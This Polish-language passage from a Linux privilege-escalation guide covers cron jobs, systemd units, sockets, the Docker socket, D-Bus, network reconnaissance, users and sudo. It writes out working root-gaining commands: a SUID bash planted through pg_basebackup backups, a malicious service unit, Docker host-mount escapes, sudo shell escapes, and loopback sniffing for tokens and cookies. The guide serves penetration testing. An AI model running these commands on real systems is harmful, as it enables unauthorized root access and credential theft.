Podmiana, która zadziałała, została podpisana przy użyciu wyciekłego prywatnego materiału do podpisywania i narzędzia ELF signer. [Dokumentacja formatu](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) opisuje sekcję podpisu wyprowadzoną z `.text` pliku wykonywalnego. Nie wykazano, że samo dodanie certyfikatu lub pasującego ciągu do `.text_sig` spełnia wymagania niewidocznego weryfikatora. Zanim uznasz, że zapisywalna podpisana binarka jest podatna na wykorzystanie, sprawdź faktycznie zaplanowaną ścieżkę, efektywne uprawnienia zapisu, wywołanie przez roota i zasady weryfikatora. Sama sekcja `.text_sig` jest jedynie wskazówką podczas analizy.

### Często uruchamiane zadania cron

Możesz monitorować procesy, aby wyszukać te uruchamiane co 1, 2 lub 5 minut. Być może uda ci się to wykorzystać do eskalacji uprawnień.

Na przykład, aby **monitorować co 0.1 s przez 1 minutę**, **posortować według rzadziej uruchamianych poleceń** i usunąć polecenia uruchamiane najczęściej, możesz wykonać:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy uruchomiony proces).

### Kopie zapasowe roota zachowujące ustawione przez atakującego bity trybu (pg_basebackup)

Jeśli cron należący do roota uruchamia `pg_basebackup` (lub dowolne kopiowanie rekurencyjne) dla katalogu bazy danych, do którego masz prawo zapisu, możesz umieścić w nim **plik binarny SUID/SGID**, który zostanie ponownie skopiowany jako **root:root** z zachowaniem tych samych bitów trybu do katalogu kopii zapasowej.<sup>[[26]](#references)</sup>

Typowy przebieg rozpoznania (jako użytkownik DB z niskimi uprawnieniami):
- Użyj `pspy`, aby wykryć cron roota wywołujący co minutę polecenie podobne do `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potwierdź, że masz prawo zapisu do klastra źródłowego (np. `/var/lib/postgresql/14/main`), a katalog docelowy (`/opt/backups/current`) po wykonaniu zadania należy do roota.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Działa to, ponieważ `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy uruchamia go root, pliki docelowe dziedziczą **własność roota + wybrane przez atakującego bity SUID/SGID**. Każda podobna uprzywilejowana procedura tworzenia kopii zapasowej/kopiowania, która zachowuje uprawnienia i zapisuje pliki w lokalizacji wykonywalnej, jest podatna na ataki.

### Niewidoczne zadania cron

Można utworzyć zadanie cron, **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Aby wykryć tego rodzaju ukryty wpis, sprawdź pliki cron za pomocą narzędzi ujawniających znaki sterujące:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Usługi

### Zapisywalne pliki _.service_

Sprawdź, czy możesz zapisywać do jakiegokolwiek pliku `.service`. Jeśli tak, **możesz go zmodyfikować**, aby **uruchamiał** Twój **backdoor**, gdy usługa zostanie **uruchomiona**, **ponownie uruchomiona** lub **zatrzymana** (być może trzeba będzie poczekać na ponowne uruchomienie maszyny).\
Na przykład utwórz backdoor w pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia do zapisu do plików binarnych wykonywanych przez usługi**, możesz zastąpić je backdoorami, które zostaną uruchomione przy ponownym wykonaniu usług.

### PATH systemd — ścieżki względne

Możesz sprawdzić PATH używany przez **systemd** za pomocą:

```bash
systemctl show-environment
```

Jeśli okaże się, że możesz **zapisywać** w dowolnym folderze na ścieżce, możesz być w stanie **eskalować uprawnienia**. Poszukaj **ścieżek względnych używanych w plikach konfiguracji usług**, takich jak:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Następnie utwórz **plik wykonywalny** o **takiej samej nazwie jak plik binarny ze ścieżki względnej** w zapisywalnym przez Ciebie folderze systemd PATH. Gdy usługa otrzyma polecenie wykonania podatnej akcji (**Start**, **Stop**, **Reload**), zostanie uruchomiony Twój **backdoor** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać ani zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Więcej informacji o usługach znajdziesz w `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwy kończą się na `**.timer**` i które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane zamiast crona, ponieważ mają wbudowaną obsługę zdarzeń kalendarzowych i monotonicznych oraz mogą działać asynchronicznie.

Możesz wyliczyć wszystkie timery za pomocą:

```bash
systemctl list-timers --all
```

### Zapisywalne timery

Jeśli możesz modyfikować timer, możesz sprawić, że uruchomi istniejący element `systemd.unit` (np. `.service` lub `.target`).

```bash
Unit=backdoor.service
```

W dokumentacji można przeczytać, czym jest jednostka:

> Jednostka aktywowana po upływie czasu działania tego timera. Argumentem jest nazwa jednostki bez sufiksu „.timer”. Jeśli nie została określona, domyślnie jest to usługa o tej samej nazwie co jednostka timera, ale bez sufiksu. (Patrz wyżej). Zaleca się, aby aktywowana jednostka i jednostka timera miały identyczne nazwy, z wyjątkiem sufiksu.

Aby wykorzystać to uprawnienie, musisz:

- Znaleźć jednostkę systemd (np. `.service`), która **uruchamia zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **uruchamia ścieżkę względną**, i mieć **uprawnienia do zapisu do systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Więcej informacji o timerach znajdziesz w `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie symlinka do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelach klient-serwer. Do komunikacji między komputerami wykorzystują standardowe pliki deskryptorów Unix i są konfigurowane za pomocą plików `.socket`.<sup>[[14]](#references)</sup>

Gniazda można konfigurować za pomocą plików `.socket`.

**Więcej informacji o gniazdach znajdziesz w `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się od siebie, ale ogólnie **wskazują, gdzie gniazdo będzie nasłuchiwać** (ścieżkę do pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu, na którym ma nasłuchiwać itd.)
- `Accept`: Przyjmuje argument logiczny. Jeśli **ma wartość true**, dla każdego **przychodzącego połączenia uruchamiana jest instancja usługi**, do której przekazywane jest wyłącznie gniazdo połączenia. Jeśli **ma wartość false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki usługi**, a dla wszystkich połączeń uruchamiana jest tylko jedna jednostka usługi. Ta wartość jest ignorowana w przypadku gniazd datagramowych i FIFO, gdzie jedna jednostka usługi bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie ma wartość false**. Ze względu na wydajność zaleca się pisanie nowych demonów w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jeden lub więcej wierszy poleceń, które są **wykonywane przed** lub **po utworzeniu i powiązaniu** gniazd/FIFO nasłuchujących. Pierwszym tokenem wiersza polecenia musi być bezwzględna nazwa pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po zamknięciu i usunięciu** gniazd/FIFO nasłuchujących.
- `Service`: Określa nazwę jednostki **usługi aktywowanej** po otrzymaniu **przychodzącego ruchu**. To ustawienie jest dozwolone tylko dla gniazd z `Accept=no`. Domyślnie używana jest usługa o tej samej nazwie co gniazdo (z podmienionym sufiksem). W większości przypadków nie powinno być potrzeby korzystania z tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w rodzaju: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie uruchomiony przed utworzeniem gniazda. Dlatego **prawdopodobnie trzeba będzie poczekać na ponowne uruchomienie maszyny.**\
_Pamiętaj, że system musi korzystać z konfiguracji tego pliku gniazda, inaczej backdoor nie zostanie uruchomiony_

### Aktywacja gniazda + zapisywalna ścieżka jednostek (utworzenie brakującej usługi)

Inną poważną błędną konfiguracją jest:

- jednostka gniazda z `Accept=no` i `Service=<name>.service`
- brak wskazanej jednostki usługi
- możliwość zapisu przez atakującego do `/etc/systemd/system` (lub innej ścieżki wyszukiwania jednostek)

W takim przypadku atakujący może utworzyć `<name>.service`, a następnie wysłać ruch do gniazda, aby systemd załadował i uruchomił nową usługę jako root.

Szybki przebieg:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Gniazda z możliwością zapisu

Jeśli **zidentyfikujesz gniazdo z możliwością zapisu** (_mówimy tu o gniazdach Unix, a nie o plikach konfiguracyjnych `.socket`_), **możesz komunikować się** z tym gniazdem i być może wykorzystać lukę w zabezpieczeniach.

### Enumeruj gniazda Unix

```bash
netstat -a -p --unix
```

### Surowe połączenie

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Przykład wykorzystania:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Gniazda HTTP

Zwróć uwagę, że mogą istnieć **gniazda nasłuchujące na żądania HTTP** (_nie chodzi mi o pliki .socket, ale o pliki działające jako gniazda Unix_). Możesz to sprawdzić za pomocą:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Jeśli socket **odpowiada żądaniem HTTP**, możesz się z nim **komunikować** i być może **wykorzystać jakąś podatność**.

### Zapisywalny socket Docker

Socket Docker, często znajdujący się pod ścieżką `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie dostępu do zapisu do tego socketu może prowadzić do eskalacji uprawnień. Oto opis, jak można to zrobić, oraz alternatywne metody na wypadek braku Docker CLI.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz dostęp do zapisu do socketu Docker, możesz eskalować uprawnienia za pomocą następujących poleceń:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Te polecenia pozwalają uruchomić kontener z dostępem na poziomie root do systemu plików hosta.

#### **Bezpośrednie użycie Docker API**

Gdy Docker CLI jest niedostępne, nadal można nadużyć gniazda Docker, używając surowych żądań HTTP przez gniazdo Unix. Najbardziej niezawodny sposób:

- utworzyć długotrwały kontener pomocniczy z katalogiem głównym hosta podmontowanym przez bind mount
- uruchomić go
- utworzyć instancję `exec` w tym kontenerze pomocniczym
- uruchomić instancję `exec` i odczytać dane wyjściowe za pośrednictwem API

**Wyświetlanie obrazów Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Utwórz i uruchom kontener pomocniczy**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Utwórz instancję exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Uruchom instancję exec i odczytaj wynik**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ten wzorzec jest zwykle bardziej niezawodny niż próby ręcznego użycia `attach` za pomocą `socat` lub `nc -U`. Gdy możesz utworzyć helper z `/:/host`, możesz użyć dodatkowych instancji `exec`, aby odczytywać pliki, takie jak `/host/root/...`, dodawać klucze SSH w `/host/root/.ssh` lub modyfikować pliki startowe hosta.

### Inne

Pamiętaj, że jeśli masz uprawnienia do zapisu w docker socket, ponieważ **należysz do grupy `docker`**, masz [**więcej sposobów na eskalację uprawnień**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Jeśli [**API docker nasłuchuje na porcie**, możesz również je skompromitować](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z kontenerów lub nadużywanie runtime’ów kontenerów w celu eskalacji uprawnień**:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacja uprawnień za pomocą Containerd (ctr)

Jeśli okaże się, że możesz używać polecenia **`ctr`**, przeczytaj następną stronę, ponieważ **możesz móc go nadużyć w celu eskalacji uprawnień**:

{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacja uprawnień za pomocą **RunC**

Jeśli okaże się, że możesz używać polecenia **`runc`**, przeczytaj następną stronę, ponieważ **możesz móc go nadużyć w celu eskalacji uprawnień**:

{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom wydajną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnych systemach Linux, oferuje solidne środowisko do obsługi różnych form komunikacji między aplikacjami.<sup>[[16]](#references)</sup>

System jest wszechstronny i obsługuje podstawową komunikację IPC, która usprawnia wymianę danych między procesami, przypominając **rozszerzone gniazda domeny UNIX**. Ułatwia także rozgłaszanie zdarzeń lub sygnałów, zapewniając płynną integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o połączeniu przychodzącym może skłonić odtwarzacz muzyki do wyciszenia dźwięku, poprawiając komfort użytkownika. Ponadto D-Bus obsługuje system obiektów zdalnych, upraszczając żądania usług i wywołania metod między aplikacjami oraz usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa w oparciu o **model zezwalania/blokowania**, zarządzając uprawnieniami do wiadomości (wywołań metod, emisji sygnałów itp.) na podstawie łącznego działania pasujących reguł polityki. Polityki te określają interakcje z magistralą i mogą umożliwić eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Poniżej przedstawiono przykład takiej polityki z pliku `/etc/dbus-1/system.d/wpa_supplicant.conf`, która określa uprawnienia użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie globalne, natomiast polityki w kontekście „default” mają zastosowanie do wszystkich przypadków, których nie obejmują inne, bardziej szczegółowe polityki.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Dowiedz się tutaj, jak enumerować i wykorzystać komunikację D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerować sieć i ustalić pozycję maszyny.

### Ogólna enumeracja

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Jeśli aktywny wpis w `/etc/inetd.conf` uruchamia `telnetd` z GNU Inetutils jako root, sprawdź skonfigurowaną wersję binarną i lokalny listener, nawet jeśli port jest powiązany tylko z loopbackiem. W wersjach GNU Inetutils od 1.9.3 do 2.7 występował [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89), w którym dostarczona przez klienta wartość `USER` trafiała do `login -f` (CVE-2026-24061). Proces lub ciąg wersji to tylko wskaźnik; przed uznaniem usługi za podatną potwierdź status poprawek dostawcy i sprawdź faktycznie uruchomiony daemon. Więcej informacji zawiera [przewodnik po Telnecie](../../../network-services-pentesting/pentesting-telnet.md).

### Szybka wstępna analiza filtrowania ruchu wychodzącego

Jeśli host może uruchamiać polecenia, ale callbacki nie działają, szybko rozdziel filtrowanie DNS, transportu, proxy i tras:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie udało Ci się wejść w interakcję przed uzyskaniem do niej dostępu:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klasyfikuj nasłuchujące usługi według adresu bindowania:

- `0.0.0.0` / `[::]`: dostępne na wszystkich lokalnych interfejsach.
- `127.0.0.1` / `::1`: dostępne tylko lokalnie (dobre cele do tunelowania/przekierowania).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zazwyczaj dostępne tylko z sieci wewnętrznych.

### Procedura wstępnej analizy usług dostępnych tylko lokalnie

Po przejęciu hosta usługi nasłuchujące na `127.0.0.1` często po raz pierwszy stają się dostępne z Twojej powłoki. Szybka lokalna procedura wygląda następująco:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS jako skaner sieci (tryb tylko sieciowy)

Oprócz lokalnych kontroli PE, linPEAS może działać jako wyspecjalizowany skaner sieci. Korzysta z dostępnych plików binarnych w `$PATH` (zazwyczaj `fping`, `ping`, `nc`, `ncat`) i nie instaluje żadnych narzędzi.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Jeśli podasz `-d`, `-p` lub `-i` bez `-t`, linPEAS działa jako czysty skaner sieci (pomijając pozostałe kontrole eskalacji uprawnień).

### Sniffing

Sprawdź, czy możesz sniffować ruch sieciowy. Jeśli tak, możesz być w stanie przechwycić dane uwierzytelniające.

```
timeout 1 tcpdump
```

Szybkie praktyczne sprawdzenia:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) jest szczególnie cenny w post-exploitation, ponieważ wiele usług dostępnych tylko wewnętrznie udostępnia tam tokeny/cookies/poświadczenia:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Przechwytuj teraz, parsuj później:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Użytkownicy

### Ogólne rozpoznanie

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** znajdują się w systemach, którzy mogą się **logować**, a którzy mają **uprawnienia root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Duże UID

Niektóre wersje Linuksa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** eskalować uprawnienia. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Wykorzystaj to** za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem grupy**, która może zapewnić Ci uprawnienia roota:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajdują się jakieś interesujące dane (jeśli to możliwe)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Polityka haseł

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Znane hasła

Jeśli **znasz jakieś hasło** z danego środowiska, **spróbuj zalogować się jako każdy użytkownik**, używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego szumu, a na komputerze są dostępne binaria `su` i `timeout`, możesz spróbować przeprowadzić brute-force użytkowników za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli możesz **zapisywać w którymś folderze ze zmiennej $PATH**, możesz eskalować uprawnienia, **tworząc backdoor w zapisywalnym folderze** pod nazwą polecenia, które zostanie wykonane przez innego użytkownika (najlepiej roota) i które **nie zostanie załadowane z folderu znajdującego się wcześniej w $PATH niż zapisywalny folder**.

### SUDO i SUID

Możesz mieć uprawnienia do wykonywania niektórych poleceń za pomocą sudo albo mogą one mieć ustawiony bit suid. Sprawdź to za pomocą:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Niektóre **nieoczekiwane polecenia umożliwiają odczyt i/lub zapis plików, a nawet wykonanie polecenia**.<sup>[[8]](#references)</sup> Na przykład:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Konfiguracja sudo może umożliwiać użytkownikowi wykonanie niektórych poleceń z uprawnieniami innego użytkownika bez znajomości hasła.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`, więc teraz łatwo uzyskać shell, dodając klucz SSH do katalogu `root` albo wywołując `sh`.

```
sudo vim -c '!sh'
```

### Niezacytowane porównanie Bash w skrypcie sudo

W Bash prawa strona wyrażenia `[[ "$protected" == $candidate ]]` jest wzorcem. Jeśli skrypt sudo z uprawnieniami roota pobiera `candidate` z pliku kontrolowanego przez wywołującego, wartość taka jak `prefix*` może pasować do początku chronionego ciągu. Różne ścieżki powodzenia i błędu mogą wtedy ujawniać prefix oracle. Jeśli zamierzone jest dosłowne porównanie, ujmij prawą stronę w cudzysłowy (`[[ "$protected" == "$candidate" ]]`). Zanim uznasz niezacytowane porównanie za podatne na wykorzystanie, sprawdź rzeczywiste argumenty sudo, pochodzenie danych wejściowych oraz obserwowalne zachowanie poszczególnych gałęzi. [Podręcznik GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) opisuje to zachowanie wzorców.

### Pliki projektów PrusaSlicer uruchamiane przez sudo

Nieograniczone nadanie przez sudo uprawnień do uruchamiania `prusaslicer` lub `prusa-slicer` z uprawnieniami roota wymaga sprawdzenia, jeśli wywołujący może wybrać projekt `.3mf` przeznaczony do cięcia. Projekt może zawierać skrypt przetwarzania końcowego uruchamiany podczas eksportu G-code; spreparowane projekty mogły wykonywać polecenia w PrusaSlicer do wersji 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Zanim uznasz, że możliwe jest przekroczenie granicy uprawnień, sprawdź obowiązującą regułę sudo, wersję programu i poprawki dostawcy, źródło projektu oraz to, czy odpowiednia ścieżka eksportu jest uruchamiana. Stały argument projektu lub skuteczna polityka `NOEXEC` mogą zmienić wynik. Sam fakt, że slicer jest zainstalowany, nie dowodzi istnienia ścieżki eskalacji uprawnień.

### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ten przykład, **oparty na maszynie HTB Admirer**, był **podatny na PYTHONPATH hijacking**, co umożliwiało załadowanie dowolnej biblioteki Pythona podczas wykonywania skryptu jako root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Zatruwanie zapisywalnego `__pycache__` / `.pyc` w importach Python dozwolonych przez sudo

Jeśli **skrypt Python dozwolony przez sudo** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz zastąpić buforowany plik `.pyc` i uzyskać wykonanie kodu jako uprzywilejowany użytkownik przy następnym imporcie.<sup>[[30]](#references)</sup>

- Dlaczego to działa:
  - CPython przechowuje bufory kodu bajtowego w `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter weryfikuje **nagłówek** (sygnaturę magiczną + metadane znacznika czasu/hash powiązane ze źródłem), a następnie wykonuje obiekt kodu zapisany w formacie marshaled za tym nagłówkiem.
